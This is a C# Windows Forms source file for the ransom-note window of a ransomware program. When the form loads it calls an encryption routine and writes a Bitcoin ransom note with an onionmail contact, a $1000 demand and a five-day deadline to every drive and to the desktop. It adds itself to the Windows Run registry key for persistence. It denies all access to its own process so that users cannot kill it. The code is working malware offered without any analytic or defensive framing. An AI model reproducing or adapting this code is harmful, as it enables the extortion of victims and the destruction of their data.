using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SF;

public class link2 : Form
{
	[Flags]
	public enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100000,
		WRITE_DAC = 0x40000,
		WRITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0x1F0FFF
	}

	private IContainer components = null;

	private ToolTip tips;

	private Label label2;

	private LinkLabel email1;

	private Label label5;

	private Label label6;

	private LinkLabel link1;

	private LinkLabel linkLabel3;

	private LinkLabel link3;

	private Label label7;

	private GroupBox groupBox1;

	private Label label4;

	private TextBox txtpid;

	private Label label8;

	private LinkLabel email2;

	private Label label9;

	private RichTextBox richTextBox1;

	private Label label1;

	private Label label10;

	private Label label11;

	private Button button1;

	public static string Message { get; } = "\"\r\nAll your data has been locked us. You want to return? Contact to: yoycanbringallyourfilesback@onionmail.org\r\n All your information is locked With Strong Randsomware\r\nIf You Want To Get Your Information Back Fast And Easy Like Never Happend , You Have To Pay\r\n((( We only Accept Bitcoin )))\r\n\r\nYou Dont Know About Bitcoin !? :\r\nhttps://www.investopedia.com/tech/how-to-buy-bitcoin/\r\nHow Can i Buy Bitcoin To Any Country :\r\nhttps://localbitcoins.com\r\nhttps://paxful.com/\r\n\r\n\r\n\r\n(( Send Email Us Only You Want Pay : yoycanbringallyourfilesback@onionmail.org ))\r\nApart From Paying Any Other Words You Use In Email = Blocked From Us  So .. Do Like Smart Man\r\n(( After Read This Note : You Only Have 5 Days To Back Your Files , Then You Cant Back ( Beacuse You Late Time End ) We Will Delete Your Decrypt Key ))\r\n\r\nWe are Professionals So No Antivirus Or Software Will Help You\r\nIt Only Destroys Your Information\r\nSo ... Don't Act like a Fool Only We Can Save Your Job And Information\r\n\r\n>>>>>>>>>>>> Cost For Your All Data Decrypt : $1000  <<<<<<<<<<<<<<<<<<\r\n\r\nTo Prove That We Can Only Get Your information Back : You Can Send Us A One Locked File And We Will Decrypt It\r\nThe File Should Not Important Dont .... Send .Jpg .Png .Txt Beacuse Its Only For Prove\r\n\r\nNOTE :\r\n- My mother is sick\r\n- I have no money to open for God's Please\r\n- Give me the key first, then I'll Pay\r\n- Half Open information I Pay Half\r\n(( We Don't Care All Up Words ))\r\nNo Money ! No Decryption \r\n\\n\\n\"";


	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	public static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if (lpnLengthNeeded < 0 || (long)lpnLengthNeeded > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	public static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public link2()
	{
		InitializeComponent();
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
		processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText(Main.DesktopDirectory + "\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("D:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("C:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("E:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("F:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("G:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("H:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("I:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			try
			{
				File.WriteAllText("J:\\ReadME-Decrypt.txt", Message + "\n\n\n\n Your Personal ID: " + text);
			}
			catch (Exception)
			{
			}
			txtpid.Text = text;
		}
		try
		{
			SetStartup();
		}
		catch (Exception)
		{
		}
	}

	public void SetStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Application.ProductName, Application.ExecutablePath);
	}

	public static string GetPhysicalMemory()
	{
		ManagementScope scope = new ManagementScope();
		ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query);
		ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
		long num = 0L;
		long num2 = 0L;
		foreach (ManagementObject item in managementObjectCollection)
		{
			num2 = Convert.ToInt64(item["Capacity"]);
			num += num2;
		}
		return num / 1024 / 1024 + " MB";
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	private void link1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		link1.LinkVisited = true;
		Process.Start("https://www.investopedia.com/tech/how-to-buy-bitcoin");
	}

	private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		linkLabel3.LinkVisited = true;
		Process.Start("https://localbitcoins.com");
	}

	private void link3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		link3.LinkVisited = true;
		Process.Start("https://paxful.com");
	}

	private void email1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		email1.LinkVisited = true;
		Process.Start("mailto:yoycanbringallyourfilesback@onionmail.org");
	}

	private void email2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		email2.LinkVisited = true;
		Process.Start("mailto:yoycanbringallyourfilesback@onionmail.org");
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(txtpid.Text);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(link2));
            this.tips = new System.Windows.Forms.ToolTip(this.components);
            this.label2 = new System.Windows.Forms.Label();
            this.email1 = new System.Windows.Forms.LinkLabel();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.link1 = new System.Windows.Forms.LinkLabel();
            this.linkLabel3 = new System.Windows.Forms.LinkLabel();
            this.link3 = new System.Windows.Forms.LinkLabel();
            this.label7 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.button1 = new System.Windows.Forms.Button();
            this.txtpid = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.email2 = new System.Windows.Forms.LinkLabel();
            this.label9 = new System.Windows.Forms.Label();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.groupBox1.SuspendLayout();
            this.SuspendLayout();
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(15, 80);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(301, 13);
            this.label2.TabIndex = 27;
            this.label2.Text = "All your data has been locked us with algoritm : ";
            // 
            // email1
            // 
            this.email1.AutoSize = true;
            this.email1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.email1.LinkColor = System.Drawing.Color.White;
            this.email1.Location = new System.Drawing.Point(15, 103);
            this.email1.Name = "email1";
            this.email1.Size = new System.Drawing.Size(168, 20);
            this.email1.TabIndex = 39;
            this.email1.TabStop = true;
            this.email1.Text = "user@onionmail.org";
            this.email1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.email1_LinkClicked);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(21, 129);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(553, 39);
            this.label5.TabIndex = 40;
            this.label5.Text = "All your information is locked With Strong Randsomware\r\nIf You Want To Get Your I" +
    "nformation Back Fast And Easy Like Never Happend , You Have To Pay\r\n( We only Ac" +
    "cept Bitcoin)";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.White;
            this.label6.Location = new System.Drawing.Point(15, 189);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(199, 13);
            this.label6.TabIndex = 41;
            this.label6.Text = "You Dont Know About Bitcoin !? :";
            // 
            // link1
            // 
            this.link1.AutoSize = true;
            this.link1.Location = new System.Drawing.Point(16, 212);
            this.link1.Name = "link1";
            this.link1.Size = new System.Drawing.Size(322, 13);
            this.link1.TabIndex = 42;
            this.link1.TabStop = true;
            this.link1.Text = "https://www.investopedia.com/tech/how-to-buy-bitcoin";
            this.link1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.link1_LinkClicked);
            // 
            // linkLabel3
            // 
            this.linkLabel3.AutoSize = true;
            this.linkLabel3.Location = new System.Drawing.Point(16, 263);
            this.linkLabel3.Name = "linkLabel3";
            this.linkLabel3.Size = new System.Drawing.Size(149, 13);
            this.linkLabel3.TabIndex = 43;
            this.linkLabel3.TabStop = true;
            this.linkLabel3.Text = "https://localbitcoins.com";
            this.linkLabel3.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel3_LinkClicked);
            // 
            // link3
            // 
            this.link3.AutoSize = true;
            this.link3.Location = new System.Drawing.Point(16, 285);
            this.link3.Name = "link3";
            this.link3.Size = new System.Drawing.Size(112, 13);
            this.link3.TabIndex = 44;
            this.link3.TabStop = true;
            this.link3.Text = "https://paxful.com";
            this.link3.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.link3_LinkClicked);
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.ForeColor = System.Drawing.Color.White;
            this.label7.Location = new System.Drawing.Point(16, 241);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(235, 13);
            this.label7.TabIndex = 45;
            this.label7.Text = "How Can i Buy Bitcoin To Any Country :";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.button1);
            this.groupBox1.Controls.Add(this.txtpid);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.ForeColor = System.Drawing.Color.White;
            this.groupBox1.Location = new System.Drawing.Point(15, 572);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(910, 90);
            this.groupBox1.TabIndex = 46;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Cost and Your Personal ID for Decrypt";
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Black;
            this.button1.Location = new System.Drawing.Point(767, 52);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(137, 23);
            this.button1.TabIndex = 49;
            this.button1.Text = "Copy Personal ID";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // txtpid
            // 
            this.txtpid.BackColor = System.Drawing.SystemColors.MenuText;
            this.txtpid.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtpid.ForeColor = System.Drawing.Color.White;
            this.txtpid.Location = new System.Drawing.Point(95, 58);
            this.txtpid.Name = "txtpid";
            this.txtpid.ReadOnly = true;
            this.txtpid.Size = new System.Drawing.Size(666, 12);
            this.txtpid.TabIndex = 48;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(6, 58);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(91, 13);
            this.label4.TabIndex = 47;
            this.label4.Text = "Personal ID : ";
            this.label4.Click += new System.EventHandler(this.label4_Click);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.White;
            this.label8.Location = new System.Drawing.Point(16, 313);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(229, 13);
            this.label8.TabIndex = 47;
            this.label8.Text = "(( Send Email Us Only You Want Pay  :";
            // 
            // email2
            // 
            this.email2.AutoSize = true;
            this.email2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.email2.LinkColor = System.Drawing.Color.White;
            this.email2.Location = new System.Drawing.Point(302, 313);
            this.email2.Name = "email2";
            this.email2.Size = new System.Drawing.Size(146, 16);
            this.email2.TabIndex = 48;
            this.email2.TabStop = true;
            this.email2.Text = "user@onionmail.org";
            this.email2.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.email2_LinkClicked);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.Color.White;
            this.label9.Location = new System.Drawing.Point(489, 316);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(25, 13);
            this.label9.TabIndex = 49;
            this.label9.Text = " ))";
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.Color.Black;
            this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.richTextBox1.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.richTextBox1.ForeColor = System.Drawing.Color.White;
            this.richTextBox1.Location = new System.Drawing.Point(15, 335);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.None;
            this.richTextBox1.Size = new System.Drawing.Size(910, 219);
            this.richTextBox1.TabIndex = 51;
            this.richTextBox1.Text = resources.GetString("richTextBox1.Text");
            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Times New Roman", 27.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(17, 23);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(305, 42);
            this.label1.TabIndex = 52;
            this.label1.Text = "You Are Crypted !!!";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label10.ForeColor = System.Drawing.Color.Red;
            this.label10.Location = new System.Drawing.Point(311, 80);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(357, 15);
            this.label10.TabIndex = 53;
            this.label10.Text = "RSA 4096 , AES 256 , Blowfish , Ascii85 , HEX , UU";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label11.ForeColor = System.Drawing.Color.White;
            this.label11.Location = new System.Drawing.Point(674, 82);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(199, 13);
            this.label11.TabIndex = 54;
            this.label11.Text = "You want to return? Contact to: ";
            // 
            // link2
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.WindowText;
            this.ClientSize = new System.Drawing.Size(937, 674);
            this.Controls.Add(this.label11);
            this.Controls.Add(this.label10);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.richTextBox1);
            this.Controls.Add(this.label9);
            this.Controls.Add(this.email2);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.link3);
            this.Controls.Add(this.linkLabel3);
            this.Controls.Add(this.link1);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.email1);
            this.Controls.Add(this.label2);
            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.Black;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "link2";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

	}
}
